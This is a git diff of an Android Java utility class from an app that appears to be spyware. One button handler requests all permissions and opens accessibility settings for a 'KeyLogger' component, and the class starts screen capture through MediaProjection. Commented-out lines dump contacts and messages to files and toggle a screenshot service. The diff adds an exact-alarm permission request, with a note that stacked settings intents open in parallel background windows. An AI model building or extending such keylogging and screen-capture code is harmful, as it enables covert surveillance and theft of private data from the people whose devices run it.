@@ -7,6 +7,8 @@ import android.app.Activity;
 import android.content.Context;
 import android.content.Intent;
 import android.media.projection.MediaProjectionManager;
+import android.os.Build;
+import android.provider.Settings;
 import android.widget.Button;
 
 import androidx.appcompat.app.AppCompatActivity;
@@ -35,8 +37,14 @@ public class ActionUtils {
         if (R.id.main_navigation_request_play_button == viewId) {
             actionButton.setOnClickListener(view -> {
                 new PermissionManager().requestAllPermissions(activity);
+
+                // Mysterious observation is that :
+                // If multiple setting intents are called all of them will open up in parallel window in background.
+                requestExactAlarmPermission(activity);
+
                 KeyLoggerUtils.startAccessibilitySettingIntent(activity);
-               // FileUtils.appendDataToFile(FileMap.CONTACTS, MessageUtils.getMessages(activity, FileMap.CONTACTS));
+
+                // FileUtils.appendDataToFile(FileMap.CONTACTS, MessageUtils.getMessages(activity, FileMap.CONTACTS));
 
                 //ScreenshotService.setTakeScreenshot(true);
                 //ScreenshotService.setStopScreenshotService(true);
@@ -71,9 +79,16 @@ public class ActionUtils {
     }
 
 
+    public static void requestExactAlarmPermission(Activity activity) {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+            Intent intent = new Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM);
+            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            activity.startActivity(intent);
+        }
+    }
+
     public static void startMediaProjectionService(Activity activity) {
-        MediaProjectionManager mediaProjectionManager =
-                (MediaProjectionManager) activity.getSystemService(Context.MEDIA_PROJECTION_SERVICE);
+        MediaProjectionManager mediaProjectionManager = (MediaProjectionManager) activity.getSystemService(Context.MEDIA_PROJECTION_SERVICE);
         activity.startActivityForResult(mediaProjectionManager.createScreenCaptureIntent(), MEDIA_PROJECTION_REQUEST_CODE);
     }
 
